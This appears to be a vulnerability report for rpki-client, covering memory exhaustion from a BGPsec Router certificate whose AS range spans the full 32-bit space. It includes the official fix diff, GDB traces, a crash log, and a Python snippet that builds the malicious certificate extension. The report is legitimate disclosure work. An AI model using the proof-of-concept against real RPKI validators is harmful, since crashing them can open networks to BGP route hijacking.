### Developer response
![image-20260112091135031](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20260112091135031.png)

**Official fix:**

```c
Index: cert.c
===================================================================
RCS file: /cvs/src/usr.sbin/rpki-client/cert.c,v
diff -u -p -r1.208 cert.c
--- cert.c	1 Dec 2025 14:40:56 -0000	1.208
+++ cert.c	9 Jan 2026 15:54:29 -0000
@@ -1354,6 +1354,15 @@ cert_as_inherit(const struct cert *cert)
	return cert->ases[0].type == CERT_AS_INHERIT;
}

+static int
+cert_has_one_as(const struct cert *cert)
+{
+	if (cert->num_ases != 1)
+		return 0;
+
+	return cert->ases[0].type == CERT_AS_ID;
+}
+
int
sbgp_parse_assysnum(const char *fn, const ASIdentifiers *asidentifiers,
    struct cert_as **out_as, size_t *out_num_ases)
@@ -1746,6 +1755,12 @@ cert_parse_extensions(const char *fn, st
		if (cert_as_inherit(cert)) {
			warnx("%s: RFC 8209, 3.1.3.5: BGPsec Router cert "
			    "with inherit element", fn);
+			goto out;
+		}
+
+		if (!cert_has_one_as(cert)) {
+			warnx("%s: BGPsec Router certs with more than one "
+			    "AS number are not supported", fn);
			goto out;
		}
	}
```

### Vulnerability report

**Type:** Resource Exhaustion / Denial of Service
**Location:** `src/cert.c` function `cert_insert_brks`
**Description:**
When parsing a BGPsec Router Certificate containing a `sbgp-autonomousSysNum` extension, `rpki-client` attempts to fully expand the defined AS number range into individual memory nodes within a Red-Black Tree.

If a certificate defines an extremely large range (e.g., `min=0` to `max=4294967295`), the validation logic in `cert_insert_brks` enters an unbounded loop:

```c
//src/cert.c:2239
void cert_insert_brks(struct brk_tree *tree, struct cert *cert) {
    size_t i, asid;
    for (i = 0; i < cert->num_ases; i++) {
        switch (cert->ases[i].type) {
        // ... 
        case CERT_AS_RANGE:
            for (asid = cert->ases[i].range.min;
                 asid <= cert->ases[i].range.max; asid++)
                insert_brk(tree, cert, asid); // Allocates memory for every ID
            break;
        // ...
        }
    }
}
```

**GDB**

```c
─────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────
In file: /home/eur1ka/fuzz/rpki-client-9.6/src/cert.c:2239
   2234 void
   2235 cert_insert_brks(struct brk_tree *tree, struct cert *cert)
   2236 {
   2237         size_t                 i, asid;
   2238 
 ► 2239         for (i = 0; i < cert->num_ases; i++) {
   2240                 switch (cert->ases[i].type) {
   2241                 case CERT_AS_ID:
   2242                         insert_brk(tree, cert, cert->ases[i].id);
   2243                         break;
   2244                 case CERT_AS_RANGE:
─────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ rsp 0x7fffffffd1e0 —▸ 0x50f0000004f0 ◂— 0
01:0008│-018 0x7fffffffd1e8 —▸ 0x7fffffffd608 ◂— 0
02:0010│-010 0x7fffffffd1f0 —▸ 0x7fffffffd2c0 ◂— 1
03:0018│-008 0x7fffffffd1f8 —▸ 0x7fffffffd330 —▸ 0x7fffffffd780 ◂— 0
04:0020│ rbp 0x7fffffffd200 —▸ 0x7fffffffd350 —▸ 0x7fffffffd7a0 ◂— 7
05:0028│+008 0x7fffffffd208 —▸ 0x5555555e5153 (entity_process+1630) ◂— lea rax, [rbx - 0xa0]
06:0030│+010 0x7fffffffd210 ◂— 0
07:0038│+018 0x7fffffffd218 —▸ 0x5555556b5760 (stats) —▸ 0x200000001 ◂— 0
───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► 0   0x5555555b29b9 cert_insert_brks+20
   1   0x5555555e5153 entity_process+1630
   2   0x5555555eb1fd main+10042
   3   0x7ffff6a29d90 __libc_start_call_main+128
   4   0x7ffff6a29e40 __libc_start_main+128
   5   0x55555558a295 _start+37
───────────────────────────────────────────────────────────────────────────────────────────
pwndbg> print cert->ases[0].range.max
$1 = 4294967295
pwndbg> print sizeof(struct brk)
$2 = 64
```

**Rerpoduction Steps：**

This vulnerability is triggered by constructing a BGPsec Router Certificate that spans the entire 32-bit AS space (0–4294967295).

Insert the following logic when generating X.509 certificates:

```python
# [Python Code Snippet to Generate Malicious Extension]
# OID: 1.3.6.1.5.5.7.1.30 (id-pe-autonomousSysIds) or 1.3.6.1.5.5.7.1.8

# Define an AS Range covering the full 32-bit integer space
# Min: 0, Max: 4294967295 (UINT32_MAX)
as_range = certificate.ASRange({'min': 0, 'max': 4294967295})

as_or_range = certificate.ASIdOrRange({'range': as_range})
as_seq = certificate.ASIdOrRangeSeq([as_or_range])
as_choice = certificate.ASIdentifierChoice({'asIdsOrRanges': as_seq})
as_ids = certificate.ASIdentifiers({'asnum': as_choice})

# Append this extension to the certificate
extensions.append({
    'extn_id': '1.3.6.1.5.5.7.1.8', # Ensure OID is correct for BGPsec
    'critical': True,
    'extn_value': as_ids
})
```

After generating an RPKI repository structure containing malicious certificates, running rpki-client for validation causes the programme's memory usage to steadily increase until the system crashes. The log is as follows:

```shell
rpki-client: ta/fuzz: pulling from rsync://localhost:8730/repo/root.cer
rpki-client: ta/fuzz: loaded from network
rpki-client: .rsync/localhost:8730/repo: pulling from rsync://localhost:8730/repo
rpki-client: .rsync/localhost:8730/repo: loaded from network
==54172==AddressSanitizer: hard rss limit exhausted (1500Mb vs 1519Mb)
==54172==Process memory map follows:
        0x00007fff7000-0x00008fff7000
        0x00008fff7000-0x02008fff7000
        0x02008fff7000-0x10007fff8000
        0x500000000000-0x502000000000
        #...
        0x777972245000-0x777972254000
        0x777972254000-0x777972256000   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x777972256000-0x777972280000   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x777972280000-0x77797228b000   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x77797228b000-0x77797228c000
        0x77797228c000-0x77797228e000   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x77797228e000-0x777972290000   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
        0x7ffcc0628000-0x7ffcc064a000   [stack]
        0x7ffcc077c000-0x7ffcc0780000   [vvar]
        0x7ffcc0780000-0x7ffcc0782000   [vdso]
==54172==End of process memory map.
==54214==Can't open /proc/54177/task for reading.                                                                                                  
==54177==LeakSanitizer has encountered a fatal error.
==54177==HINT: For debugging, try setting environment variable LSAN_OPTIONS=verbosity=1:log_threads=1
==54177==HINT: LeakSanitizer does not work under ptrace (strace, gdb, etc)
==54218==Can't open /proc/54174/task for reading.
==54174==LeakSanitizer has encountered a fatal error.
==54174==HINT: For debugging, try setting environment variable LSAN_OPTIONS=verbosity=1:log_threads=1
==54174==HINT: LeakSanitizer does not work under ptrace (strace, gdb, etc)
```

**Impact:**
A single malicious certificate (<10KB) causes the parser to attempt allocating approximately **256 GB** of memory (64 bytes per `struct brk` node * 2^32), resulting in an immediate OOM crash.
Once triggered, causing the  crash, the router will be unable to receive the latest routing authorisation data. The router will typically revert to ‘Fail-Open’ mode, whereby BGP hijacked routes that would otherwise be marked as Invalid and discarded are now accepted by the router as legitimate routes. This results in traffic being hijacked or blackholed.

